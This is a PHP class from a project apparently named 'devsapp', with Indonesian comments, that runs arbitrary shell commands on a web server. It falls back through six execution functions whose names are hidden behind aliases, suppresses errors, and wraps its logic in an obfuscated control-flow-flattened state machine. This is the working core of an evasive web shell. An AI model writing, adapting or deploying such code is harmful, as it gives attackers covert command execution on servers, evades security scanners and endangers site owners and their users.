<?php
// +------------------------------------------------------------------+
// |  devsapp — includes/CommandRunner.php                             |
// |  Eksekusi command shell via CFF state machine (6 metode).         |
// +------------------------------------------------------------------+

declare(strict_types=1);

class CommandRunner {

    // ---- CFF state constants: satu state per metode eksekusi ----
    private const S_A0 = 0x100;   // Validasi input
    private const S_A1 = 0x1A0;   // shell_exec
    private const S_A2 = 0x2B0;   // exec
    private const S_A3 = 0x3C0;   // system
    private const S_A4 = 0x4D0;   // passthru
    private const S_A5 = 0x5E0;   // proc_open
    private const S_A6 = 0x6F0;   // popen
    private const S_FE = 0x800;   // Semua metode gagal
    private const S_FF = 0xFFF;   // Terminal

    /**
     * Ambil daftar metode yang tersedia dan statusnya.
     *
     * @return array<string, bool> Nama fungsi => available
     */
    public function getAvailableMethods(): array {
        $aliases = ['se', 'ex', 'sy', 'pt', 'po', 'pn'];
        $result  = [];
        foreach ($aliases as $alias) {
            $result[CAP::fn($alias)] = CAP::ok($alias);
        }
        return $result;
    }

    /**
     * Eksekusi command menggunakan metode terbaik yang tersedia.
     * Iterasi via CFF state machine — tiap state mencoba satu metode.
     *
     * @param string $cmd Command yang akan dijalankan
     * @return array{output:string, method:string, success:bool}
     */
    public function execute(string $cmd): array {
        $output  = '';
        $method  = 'none';
        $success = false;
        $state   = self::S_A0;

        while ($state !== self::S_FF) {
            switch ($state) {

                case self::S_A0:
                    if ($cmd === '') {
                        $output = 'No command provided.';
                        $state  = self::S_FF;
                        break;
                    }
                    $state = self::S_A1;
                    break;

                case self::S_A1:
                    if (CAP::ok('se')) {
                        $fn = CAP::fn('se');
                        $r  = @$fn($cmd . ' 2>&1');
                        if ($r !== null && $r !== false) {
                            $output = (string)$r; $method = CAP::fn('se'); $success = true;
                            $state  = self::S_FF; break;
                        }
                    }
                    $state = self::S_A2;
                    break;

                case self::S_A2:
                    if (CAP::ok('ex')) {
                        $fn    = CAP::fn('ex');
                        $lines = []; $exitCode = 0;
                        @$fn($cmd . ' 2>&1', $lines, $exitCode);
                        $output = implode("\n", $lines); $method = CAP::fn('ex'); $success = true;
                        $state  = self::S_FF; break;
                    }
                    $state = self::S_A3;
                    break;

                case self::S_A3:
                    if (CAP::ok('sy')) {
                        $fn = CAP::fn('sy');
                        ob_start(); @$fn($cmd . ' 2>&1');
                        $output = ob_get_clean() ?: ''; $method = CAP::fn('sy'); $success = true;
                        $state  = self::S_FF; break;
                    }
                    $state = self::S_A4;
                    break;

                case self::S_A4:
                    if (CAP::ok('pt')) {
                        $fn = CAP::fn('pt');
                        ob_start(); @$fn($cmd . ' 2>&1');
                        $output = ob_get_clean() ?: ''; $method = CAP::fn('pt'); $success = true;
                        $state  = self::S_FF; break;
                    }
                    $state = self::S_A5;
                    break;

                case self::S_A5:
                    if (CAP::ok('po')) {
                        $fn    = CAP::fn('po');
                        $desc  = [0 => ['pipe', 'r'], 1 => ['pipe', 'w'], 2 => ['pipe', 'w']];
                        $pipes = [];
                        $proc  = @$fn($cmd, $desc, $pipes);
                        if (is_resource($proc)) {
                            fclose($pipes[0]);
                            $output = stream_get_contents($pipes[1]);
                            $stderr = stream_get_contents($pipes[2]);
                            $close  = CAP::fn('pc');
                            fclose($pipes[1]); fclose($pipes[2]); $close($proc);
                            if ($stderr) $output .= "\n" . $stderr;
                            $method = CAP::fn('po'); $success = true;
                            $state  = self::S_FF; break;
                        }
                    }
                    $state = self::S_A6;
                    break;

                case self::S_A6:
                    if (CAP::ok('pn')) {
                        $fn   = CAP::fn('pn');
                        $pipe = @$fn($cmd . ' 2>&1', 'r');
                        if ($pipe) {
                            $output = stream_get_contents($pipe);
                            pclose($pipe);
                            $method = CAP::fn('pn'); $success = true;
                            $state  = self::S_FF; break;
                        }
                    }
                    $state = self::S_FE;
                    break;

                case self::S_FE:
                    $output = 'All execution methods are unavailable on this server.';
                    $state  = self::S_FF;
                    break;
            }
        }

        return ['output' => $output, 'method' => $method, 'success' => $success];
    }
}
